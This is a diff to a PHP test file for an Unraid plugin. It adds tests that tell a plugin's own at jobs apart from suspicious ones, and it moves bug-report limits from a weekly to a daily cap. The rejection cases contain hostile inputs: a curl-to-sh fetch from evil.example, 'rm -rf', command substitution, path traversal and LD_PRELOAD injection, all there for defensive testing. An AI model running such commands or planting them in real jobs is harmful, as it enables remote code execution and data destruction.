@@ -7333,6 +7333,117 @@ function testWatchmanAtUserScript(): void
 }
 
 /**
+ * A plugin's own at job (Benj, 2026-10-09: Fix Common Problems' disks_mounted event queues
+ * `echo "/usr/local/emhttp/plugins/fix.common.problems/scripts/scan.php" | at now +10 min -M`): a plain line in the
+ * book naming the plugin, noted by himself — only when the job is exactly one file of an installed plugin's folder
+ * (optionally after php or bash, plain arguments), as root, with an environment that can't run something else.
+ * Anything else stays an at_job; open at_job entries of that shape are closed.
+ */
+function testWatchmanAtPlugin(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-atpl-' . getmypid();
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh', 'flash/user.scripts/scripts', 'emhttp/fix.common.problems/scripts',
+              'emhttp/plain.readme', 'emhttp/odd.readme'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    file_put_contents("$src/logplugins/fix.common.problems.plg", "<PLUGIN name=\"fix.common.problems\" version=\"2026.05.16\">\n");
+    file_put_contents("$src/emhttp/fix.common.problems/README.md", "####Fix Common Problems####\nA Plugin to diagnose and suggest fixes for common problems\n");
+    file_put_contents("$src/emhttp/plain.readme/README.md", "**Plain Readme**\n");
+    file_put_contents("$src/emhttp/odd.readme/README.md", "<script>x</script>\n");
+    // the head at writes for root in an event script (cwd /), with and without at's SHELL wrapper
+    $head = fn (string $env = '', int $uid = 0) => "#!/bin/sh\n# atrun uid=$uid gid=0\n# mail root 0\numask 22\nSHELL=/bin/bash; export SHELL\nPWD=/; export PWD\n"
+        . "HOME=/root; export HOME\nPATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin; export PATH\n$env"
+        . "cd / || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
+    $wrap = fn (string $cmds) => "\${SHELL:-/bin/sh} << 'marcinDELIMITER6f1e2d3c'\n$cmds\nmarcinDELIMITER6f1e2d3c\n";
+    $scan = '/usr/local/emhttp/plugins/fix.common.problems/scripts/scan.php';
+    $is = fn (string $job) => watchmanAtPlugin($job, "$src/logplugins");
+    same('at plugin: Fix Common Problems\' scan and extended test (as it queues them; after php, /usr/bin/php, bash; plain arguments)',
+        array_fill(0, 6, 'fix.common.problems'),
+        [$is($head() . $wrap($scan)), $is($head() . "$scan\n"), $is($head() . $wrap('/usr/local/emhttp/plugins/fix.common.problems/scripts/extendedTest.php')),
+         $is($head() . $wrap("php $scan")), $is($head() . $wrap("/usr/bin/php $scan --quiet run=1")), $is($head() . $wrap('bash /usr/local/emhttp/plugins/fix.common.problems/scripts/x.sh'))]);
+    same('at plugin: anything else is not', array_fill(0, 17, null), [
+        $is($head() . $wrap('/usr/local/emhttp/plugins/evil.plugin/scripts/x.sh')),                       // not an installed plugin
+        $is($head() . $wrap('/usr/local/emhttp/plugins/fix.common.problems.plg')),                        // no file in its folder
+        $is($head() . $wrap("$scan; curl -s https://evil.example/x | sh")),                               // shell metacharacters
+        $is($head() . $wrap("$scan & ")),
+        $is($head() . $wrap("$scan | sh")),
+        $is($head() . $wrap("$scan \$(id)")),
+        $is($head() . $wrap("$scan `id`")),
+        $is($head() . $wrap("$scan > /tmp/x")),
+        $is($head() . $wrap("$scan 'quoted'")),
+        $is($head() . $wrap('/usr/local/emhttp/plugins/fix.common.problems/../../../../tmp/x')),          // out of its folder
+        $is($head() . $wrap('/usr/local/emhttp/plugins/fix.common.problems/scripts/../../dynamix/x')),
+        $is($head() . $wrap("python3 $scan")),                                                           // another interpreter
+        $is($head() . $wrap("$scan\n$scan")),                                                            // and more
+        $is($head('', 1000) . $wrap($scan)),                                                             // not as root
+        $is($head("LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n") . $wrap($scan)),                        // an environment that runs something else
+        $is($head("PATH=/tmp/\\.x:/bin; export PATH\n") . $wrap("php $scan")),
+        $is("#!/bin/sh\n$scan\n"),                                                                       // not as at writes it
+    ]);
+    same('at plugin: its name as Unraid shows it (README.md\'s first line), else the plugin\'s', ['Fix Common Problems', 'Plain Readme', 'odd.readme', 'no.readme', 'x'],
+        [watchmanAtPluginName('fix.common.problems', "$src/emhttp"), watchmanAtPluginName('plain.readme', "$src/emhttp"), watchmanAtPluginName('odd.readme', "$src/emhttp"),
+         watchmanAtPluginName('no.readme', "$src/emhttp"), watchmanAtPluginName('x', null)]);
+    $cmd = fn (string $job) => watchmanAtCommand($job);
+    $ub = [watchmanEntry('at_job', 'at_job:a1', 100, ['cmd' => $cmd($head() . $wrap($scan)), 'uid' => 0]),
+           watchmanEntry('at_job', 'at_job:a2', 100, ['cmd' => $cmd($head() . $wrap('/usr/local/emhttp/plugins/evil.plugin/x.sh')), 'uid' => 0]),
+           watchmanEntry('at_job', 'at_job:a3', 100, ['cmd' => $cmd($head() . $wrap($scan)), 'uid' => 1000]),
+           watchmanEntry('at_job', 'at_job:a4', 100, ['cmd' => $cmd($head() . $wrap("$scan " . str_repeat('a', 120))), 'uid' => 0]),
+           watchmanEntry('at_job', 'at_job:a5', 100, ['cmd' => $cmd($head() . $wrap("$scan; rm -rf /x")), 'uid' => 0])];
+    watchmanAtPluginClose($ub, ['fix.common.problems' => []], 200);
+    same('at plugin: an open entry that was only an installed plugin\'s own file, as root, is closed (by plugin), others stay',
+        [['plugin', 200], [null, null], [null, null], [null, null], [null, null]], array_map(fn ($e) => [$e['by'], $e['noted']], $ub));
+
+    // rounds: before 1.48 (or not installed yet) the scan was an alarm; installed, it's a line noted by himself and the
+    // open alarm is closed; a job with more than the plugin's file next to it is told
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
+              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
+              'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents", 'emhttp_plugins' => "$src/emhttp"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    file_put_contents($paths['syslog'], '');
+    rename("$src/logplugins/fix.common.problems.plg", "$tmp/fcp.plg");
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");                 // never Unraid's own
+    $now = 1791285000;
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+    touch("$src/logplugins", $now - 100);
+    watchmanRound($paths, $data, 1000, $now, $docker, false, $acks);
+    file_put_contents("$src/atjobs/a000dd01c78c21", $head() . $wrap($scan));
+    touch("$src/atjobs", $now + 10);
+    $r0 = watchmanRound($paths, $data, 1000, $now + 300, $docker, false, $acks);
+    rename("$tmp/fcp.plg", "$src/logplugins/fix.common.problems.plg");
+    touch("$src/logplugins", $now + 350);
+    $r1 = watchmanRound($paths, $data, 1000, $now + 400, $docker, false, $acks);
+    rename("$src/atjobs/a000dd01c78c21", "$src/atjobs/=000dd01c78c21");
+    file_put_contents("$src/atjobs/a000de01c78c40", $head() . $wrap("$scan; curl -s https://evil.example/x | sh"));
+    touch("$src/atjobs", $now + 500);
+    $r2 = watchmanRound($paths, $data, 1000, $now + 600, $docker, false, $acks);
+    $book = watchmanLoad($data)['book'];
+    $pl = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_plugin'));
+    $old = array_values(array_filter($book, fn ($e) => $e['key'] === 'at_job:a000dd01c78c21'));
+    same('at plugin: not installed — an alarm; installed (a new plugin: told as such) — the alarm closed (by plugin), one line noted by himself, nothing to tell',
+        [['at_job'], ['plugin_new'], 'plugin', false, 1, ['fix.common.problems', 'Fix Common Problems', 'fix.common.problems/scripts/scan.php', 0], 'plugin', false],
+        [$r0['added'], $r1['added'], $old[0]['by'] ?? null, watchmanOpen($old[0] ?? []), count($pl),
+         [$pl[0]['p']['plugin'] ?? null, $pl[0]['p']['name'] ?? null, $pl[0]['p']['file'] ?? null, $pl[0]['p']['uid'] ?? null], $pl[0]['by'] ?? null,
+         watchmanOpen($pl[0] ?? [])]);
+    same('at plugin: running (=) is the same job — still one line; the job with more next to it is an alarm', [['at_job'], 1, 1, ['plugin_new' => 1, 'at_job' => 1]],
+        [$r2['added'], count(array_filter($book, fn ($e) => $e['key'] === 'at_job:a000de01c78c40' && watchmanOpen($e) && ($e['by'] ?? null) === null)), count($pl),
+         watchmanOpenCounts($book)]);
+    same('at plugin: nothing for the team lead (the new plugin and the other job are)', ['plugin_new', 'at_job'], array_column(watchmanFindings($book), 'id'));
+    $page = watchmanPageState($data, $now + 700, false);
+    $row = array_values(array_filter($page['book'], fn ($e) => $e['kind'] === 'at_plugin'))[0] ?? [];
+    same('at plugin: on the page — the plugin named, noted by himself', ['Fix Common Problems', 'fix.common.problems/scripts/scan.php', false, 'plugin', 'sched'],
+        [$row['t']['name'] ?? null, $row['t']['file'] ?? null, $row['open'] ?? null, $row['by'] ?? null, $row['group'] ?? null]);
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($data, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
  * The night watchman's watch over what starts on its own: root's own crontab next to Unraid's (new
  * lines, lines in both, the office's own lines, programs gone, the syslog as evidence), the plugins'
  * .cron files, User Scripts, atd's queue, the notification agents — all on copies in a temporary folder.
@@ -20032,7 +20143,7 @@ function testReport(): void
     check('report: … the log of her desk, scrubbed', str_contains($pv['parts']['log'], 'Ms. Snapshotini: created ‹pool-2›/‹share-3›@…') && !str_contains($pv['parts']['log'], 'Backup:'), $pv['parts']['log']);
     same('report: … ticked by default (a problem: the log too)', ['versions', 'unraid', 'language', 'team', 'error', 'log'], $pv['ticked']);
     same('report: … what was hidden, and a hint at the address in the text', [['‹pool-2›' => 'hive', '‹share-3›' => 'Media'], ['address']], [(array) $pv['hidden'], $pv['hints']]);
-    same('report: … the cap', [0, 2, 2, null, false], [$pv['n'], $pv['left'], $pv['cap'], $pv['next'], $pv['closed']]);
+    same('report: … the cap', [0, REPORT_CAP_DAY, REPORT_CAP_DAY, null, false], [$pv['n'], $pv['left'], $pv['cap'], $pv['next'], $pv['closed']]);
     $kept = "$tmp/run/{$pv['token']}.json";
     same('report: … kept in RAM under its token, 0600', [true, '600', '700'], [is_file($kept), decoct(fileperms($kept) & 0777), decoct(fileperms("$tmp/run") & 0777)]);
     check('report: … the engine\'s version only for Mr. Backupsy and Mr. Restori', isset(reportPreview(['desk' => 'backup'] + $ask, $ctx + ['now' => 1760000100])['parts']['versions']['engine']));
@@ -20066,7 +20177,7 @@ function testReport(): void
 
     // the Worker's answers in the office's words — by `error` (or its `key`), never by the HTTP status
     $a = fn (int $code, array $body, int $exit = 0) => reportAnswer($exit, json_encode($body) . "\n$code", 1760000000);
-    same('report: answers mapped', ['ok', 'ok', 'report_closed', 'report_week', 'report_busy', 'report_refused', 'report_refused', 'report_failed', 'report_failed', 'report_failed', 'report_failed', 'report_busy', 'report_offline', 'report_offline'],
+    same('report: answers mapped', ['ok', 'ok', 'report_closed', 'report_day', 'report_busy', 'report_refused', 'report_refused', 'report_failed', 'report_failed', 'report_failed', 'report_failed', 'report_busy', 'report_offline', 'report_offline'],
         array_map(fn ($r) => $r['ok'] ? 'ok' : $r['key'], [$a(201, ['ok' => true, 'number' => 41, 'url' => 'https://github.com/dropnook/uso-inbox/issues/41', 'ticket' => 'USO-41', 'left' => 1, 'next' => null]),
             $a(200, ['ok' => true, 'number' => 41, 'url' => 'https://github.com/dropnook/uso-inbox/issues/41', 'again' => true]),
             $a(403, ['ok' => false, 'error' => 'closed', 'key' => 'report_closed', 'by' => 'switch']), $a(429, ['ok' => false, 'error' => 'week', 'key' => 'report_week', 'next' => '2025-10-16T09:00:00Z', 'retry_after' => 500000]),
@@ -20074,8 +20185,12 @@ function testReport(): void
             $a(413, ['ok' => false, 'error' => 'refused', 'why' => 'too_big']), $a(502, ['ok' => false, 'error' => 'github', 'key' => 'report_failed']),
             $a(503, ['ok' => false, 'error' => 'config', 'key' => 'report_failed']), $a(500, []), $a(429, []),
             $a(200, ['ok' => false, 'error' => 'x', 'key' => 'report_busy']), reportAnswer(7, '', 1), reportAnswer(0, "\n000", 1)]));
-    same('report: … the week\'s next from the Worker', ['n' => 2, 'next' => strtotime('2025-10-16T09:00:00Z')],
+    same('report: … the cap\'s next from the Worker (its old name `week`; no cap said: ours)', ['n' => REPORT_CAP_DAY, 'next' => strtotime('2025-10-16T09:00:00Z')],
         $a(429, ['ok' => false, 'error' => 'week', 'next' => '2025-10-16T09:00:00Z', 'retry_after' => 500000])['params']);
+    same('report: … the Worker\'s cap and key as it answers now; only retry_after: now + it; a «day» too', [['report_day', ['n' => 30, 'next' => 1760000000 + 3600]], ['report_day', ['n' => REPORT_CAP_DAY, 'next' => 1760000000 + 600]], 'report_day', 'report_day'],
+        [[($w = $a(429, ['ok' => false, 'error' => 'week', 'key' => 'report_week', 'retry_after' => 3600, 'cap' => 30]))['key'], $w['params']],
+         [($w = $a(429, ['ok' => false, 'error' => 'week', 'retry_after' => 600, 'cap' => 'lots']))['key'], $w['params']],
+         $a(429, ['ok' => false, 'error' => 'day'])['key'], $a(429, ['ok' => false, 'error' => 'x', 'key' => 'report_day'])['key']]);
     same('report: … a link only to a GitHub issue', ['', 'https://github.com/dropnook/uso-inbox/issues/41'],
         [$a(201, ['ok' => true, 'number' => 41, 'url' => 'javascript:alert(1)'])['url'], $a(200, ['ok' => true, 'number' => 41, 'url' => 'https://github.com/dropnook/uso-inbox/issues/41'])['url']]);
 
@@ -20131,7 +20246,7 @@ ROUTER);
     };
     $t0 = 1760000100;
     $r = $send($pv, ['versions', 'unraid', 'language', 'team', 'error', 'log'], $t0 + 5);
-    same('report: sent — the number, the link, one left', [true, 41, 'https://github.com/dropnook/uso-inbox/issues/41', 1], [$r['ok'], $r['number'] ?? null, $r['url'] ?? null, $r['left'] ?? null]);
+    same('report: sent — the number, the link, 24 left', [true, 41, 'https://github.com/dropnook/uso-inbox/issues/41', REPORT_CAP_DAY - 1], [$r['ok'], $r['number'] ?? null, $r['url'] ?? null, $r['left'] ?? null]);
     $req = json_decode((string) @file_get_contents("$tmp/request-1.json"), true) ?? [];
     $body = json_decode($req['body'] ?? '', true) ?? [];
     same('report: … one POST to /api/report, JSON, the office\'s User-Agent, no Origin, no Referer', ['/api/report', 'POST', 'UnraidSecretaryOffice/' . AGENT_VERSION, 'application/json', null, null],
@@ -20145,7 +20260,7 @@ ROUTER);
         [array_keys($rj), array_keys($rj['reports'][0] ?? []), $rj['reports'][0]['number'] ?? null, decoct(@fileperms("$tmp/office/reports.json") & 0777)]);
     same('report: … logged without its words', ['Office: sent a report (#41, bug, snapshot)'], $logged);
     $r = $send($pv, ['versions'], $t0 + 6);
-    same('report: the same token again — the first answer, no second POST', [true, 41, true, 1], [$r['ok'], $r['number'] ?? null, $r['again'] ?? null, $count()]);
+    same('report: the same token again — the first answer, no second POST', [true, 41, true, 1, REPORT_CAP_DAY - 1], [$r['ok'], $r['number'] ?? null, $r['again'] ?? null, $count(), $r['left'] ?? null]);
 
     // the stale preview, a changed word
     $pv2 = reportPreview($ask, $ctx + ['now' => $t0]);
@@ -20155,7 +20270,7 @@ ROUTER);
 
     // every answer the Worker may give: the office's key, the preview kept (the text too: the page keeps it)
     foreach ([[502, ['ok' => false, 'error' => 'github', 'key' => 'report_failed'], 'report_failed'], [400, ['ok' => false, 'error' => 'refused', 'key' => 'report_refused', 'why' => 'bad', 'field' => 'desk'], 'report_refused'],
-              [429, ['ok' => false, 'error' => 'busy', 'key' => 'report_busy', 'retry_after' => 600], 'report_busy'], [429, ['ok' => false, 'error' => 'week', 'key' => 'report_week', 'next' => '2025-10-16T09:00:00Z', 'retry_after' => 9000], 'report_week'],
+              [429, ['ok' => false, 'error' => 'busy', 'key' => 'report_busy', 'retry_after' => 600], 'report_busy'], [429, ['ok' => false, 'error' => 'week', 'key' => 'report_week', 'next' => '2025-10-16T09:00:00Z', 'retry_after' => 9000], 'report_day'],
               [500, ['oops'], 'report_failed']] as [$code, $b, $key]) {
         $answer($code, $b);
         $r = $send($pv2, ['versions'], $t0 + 20);
@@ -20180,24 +20295,36 @@ ROUTER);
         [$send($pv2, ['versions'], $t0 + 40)['key'] ?? 'ok', $count(), reportsAnswer(['now' => $t0 + 40] + $ctx)['closed']]);
     $rj = json_decode((string) @file_get_contents("$tmp/office/reports.json"), true) ?? [];
     $rj['closed_until'] = null;
+    // 23 more within the day (after #41), and two that don't count: a day old (the 7 days kept up to 1.47 count only
+    // for their last 24 h), and one of another shape
+    $entry = fn (int $n, int $sent) => ['number' => $n, 'url' => '', 'kind' => 'bug', 'title' => "t$n", 'desk' => 'office', 'sent' => $sent, 'rid' => ''];
+    array_unshift($rj['reports'], $entry(31, $t0 - 3 * 86400), $entry(32, $t0 + 5 - REPORT_DAY), ['number' => 33, 'sent' => $t0]);
+    for ($i = 1; $i <= REPORT_CAP_DAY - 2; $i++) {
+        $rj['reports'][] = $entry(100 + $i, $t0 + 5 + $i);
+    }
     file_put_contents("$tmp/office/reports.json", json_encode($rj));
+    $cap = reportsAnswer(['now' => $t0 + 45] + $ctx);
+    same('report: the cap counts the last 24 h only', [REPORT_CAP_DAY - 1, 1, REPORT_CAP_DAY], [$cap['n'], $cap['left'], $cap['cap']]);
 
-    // the second report of the week goes, the third is refused before any request
+    // the 25th of the day goes, the 26th is refused before any request
     $answer(201, ['ok' => true, 'number' => 42, 'url' => 'https://github.com/dropnook/uso-inbox/issues/42', 'ticket' => 'USO-42', 'left' => 0, 'next' => '2025-10-16T09:00:00Z']);
     $pv3 = reportPreview(['kind' => 'wish'] + $ask, $ctx + ['now' => $t0 + 50]);
     $r = $send($pv3, [], $t0 + 60, ['kind' => 'wish']);
-    same('report: the second this week — sent, none left', [true, 42, 0], [$r['ok'], $r['number'] ?? null, $r['left'] ?? null]);
+    same('report: the 25th today — sent, none left', [true, 42, 0], [$r['ok'], $r['number'] ?? null, $r['left'] ?? null]);
     $body = json_decode(json_decode((string) @file_get_contents("$tmp/request-{$count()}.json"), true)['body'] ?? '', true) ?? [];
     same('report: … nothing ticked — only the words and the ID', [['v', 'rid', 'report_id', 'kind', 'desk', 'title', 'text', 'name', 'facts', 'parts'], [], []],
         [array_keys($body), $body['facts'] ?? null, $body['parts'] ?? null]);
     $before = $count();
     $pv4 = reportPreview($ask, $ctx + ['now' => $t0 + 70]);
-    same('report: the preview says none are left, and from when', [0, $t0 + 5 + REPORT_WEEK], [$pv4['left'], $pv4['next']]);
+    same('report: the preview says none are left, and from when', [0, $t0 + 5 + REPORT_DAY], [$pv4['left'], $pv4['next']]);
     $r = $send($pv4, ['log'], $t0 + 80);
-    same('report: a third within 7 days — report_week, nobody asked', ['report_week', ['n' => 2, 'next' => $t0 + 5 + REPORT_WEEK], $before], [$r['key'] ?? 'ok', $r['params'] ?? null, $count()]);
-    same('report: … a week after the first, one goes again', 1, reportsAnswer(['now' => $t0 + 6 + REPORT_WEEK] + $ctx)['left']);
+    same('report: a 26th within 24 h — report_day, nobody asked', ['report_day', ['n' => REPORT_CAP_DAY, 'next' => $t0 + 5 + REPORT_DAY], $before], [$r['key'] ?? 'ok', $r['params'] ?? null, $count()]);
+    same('report: … a day after the first, one goes again', 1, reportsAnswer(['now' => $t0 + 5 + REPORT_DAY] + $ctx)['left']);
     $list = reportsAnswer(['now' => $t0 + 100] + $ctx);
-    same('report: «Your reports» — newest first, as kept', [[42, 41], ['number', 'url', 'kind', 'title', 'desk', 'sent']], [array_column($list['reports'], 'number'), array_keys($list['reports'][0] ?? [])]);
+    same('report: «Your reports» — newest first, as kept (an entry of another shape is none)', [[42, 123, 122], ['number', 'url', 'kind', 'title', 'desk', 'sent'], [41, 32, 31]],
+        [array_slice(array_column($list['reports'], 'number'), 0, 3), array_keys($list['reports'][0] ?? []), array_slice(array_column($list['reports'], 'number'), -3)]);
+    $rj = json_decode((string) @file_get_contents("$tmp/office/reports.json"), true) ?? [];
+    same('report: … kept as it stood (a tolerant writer)', ['number' => 33, 'sent' => $t0], $rj['reports'][2] ?? null);
 
     // what the stand-in got matches the Worker's rules (uso-support/feedback/worker.js: FIELDS, FACT_FIELDS, PART_RE …)
     $bad = [];
@@ -20231,7 +20358,7 @@ ROUTER);
  * «Report a problem or a wish…» on the page (core.js Office.reportDialog()) under node, on a stand-in page: it opens
  * with the desk shown, asks only for «Your reports», «Send» stays off until the preview was looked at; the preview
  * request carries the words, the languages and the desk's last error; a word changed takes the preview (and «Send")
- * away; the unticked parts stay home; the answer shows the number and clears the draft; report_week says its day and
+ * away; the unticked parts stay home; the answer shows the number and clears the draft; report_day says its time and
  * leaves «Send» off; the draft survives a close. The ⋯ menu's item and the team lead's button.
  */
 function testReportDialog(): void
@@ -20296,7 +20423,7 @@ const one = (f) => walk(body(), f)[0];
 const button = (label) => one((n) => n.tag === 'button' && n.textContent === label);
 (async () => {
   await sleep(30);
-  O.strings = { 'office.report_sent': 'Sent — report #{number}.', 'office.report_hidden': 'Hidden: {list}', 'errors.report_week': { one: '{n} this week; next on {day}.', other: '{n} this week; next on {day}.' } };
+  O.strings = { 'office.report_sent': 'Sent — report #{number}.', 'office.report_hidden': 'Hidden: {list}', 'errors.report_day': { one: '{n} in 24 hours; next from {when}.', other: '{n} in 24 hours; next from {when}.' } };
   O.agent = { running: true };
   O.desk({ id: 'snapshot' });
   O.desk({ id: 'caretaker' });
@@ -20344,7 +20471,7 @@ const button = (label) => one((n) => n.tag === 'button' && n.textContent === lab
   out.classesGone = byId['sso-dialog'].className;
 
   // the week is full: its day said, «Send» stays off
-  answers['office.report_send'] = { ok: false, error: { key: 'report_week', params: { n: 2, next: 1760600000 } } };
+  answers['office.report_send'] = { ok: false, error: { key: 'report_day', params: { n: 25, next: 1760600000 } } };
   const dlg2 = O.reportDialog();
   await sleep(20);
   const [t2] = walk(body(), (n) => n.tag === 'input' && n.className === 'input');
@@ -20394,7 +20521,7 @@ JS);
     same('report dialog: … the number and the link, the draft gone, «Send» gone, «Close»', ['Sent — report #41.', ['https://github.com/dropnook/uso-inbox/issues/41'], true, 'common.close', null, true],
         [$s['shown'], $s['link'], $s['sendHidden'], $s['closeText'], $s['draft'], $s['formHidden']]);
     check('report dialog: … its classes go with it', !str_contains($r['classesGone'], 'sso-report-dialog'));
-    check('report dialog: report_week says its day, «Send» stays off; no desk given and no draft: the office as a whole', str_starts_with($r['week']['msg'], '2 this week; next on ') && !str_contains($r['week']['msg'], '{day}')
+    check('report dialog: report_day says its time, «Send» stays off; no desk given and no draft: the office as a whole', str_starts_with($r['week']['msg'], '25 in 24 hours; next from ') && !str_contains($r['week']['msg'], '{when}')
         && $r['week']['sendOff'] === true && $r['week']['desk'] === 'office', json_encode($r['week']));
     same('report dialog: closed without sending — the draft stays and comes back', ['Another', 'Another'], [$r['keptDraft'], $r['reopened']]);
     $core = (string) file_get_contents(OFFICE_WEB . '/assets/core.js');
@@ -21022,7 +21149,7 @@ function testWatchBookNoteSome(): void
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSleepingPools', 'testSnapshotNames', 'testEmby', 'testEmbyWatch', 'testEmbyImport', 'testOfficeCron', 'testMenuName', 'testWhereArrayZfs', 'testEstimates', 'testBackupFirstUpload', 'testNotify', 'testNotifyLayout', 'testCaretakerAcks', 'testAckContent',
                       'testBackupPackages', 'testBackupKopiaItems', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupAsleepKept', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupArrayStop', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupPartnerOffice', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreShares', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDrill', 'testRestorePartner', 'testPartnerTicket', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testSnapshotPartner', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorInstall', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanPosture', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereBuilding', 'testCleanupTick', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testMovedDesk', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testWatchmanApiDoor', 'testCaretakerApi', 'testPartnerPairing', 'testPartnerWatch', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testPlgInstall', 'testPlgRemove', 'testBackupLetGo', 'testApiGetOffline',
-                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchBookNoteSome'],
+                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchBookNoteSome', 'testWatchmanAtPlugin'],
           'hardening' => ['testRequestTypes', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testSnapshotRecord', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testReport', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired'],
           'strings' => ['testStrings', 'testUnraidWords']];
 // php tests/run.php [<part>|<test> …] — no name: everything; else every named part and test, each once, in the order of
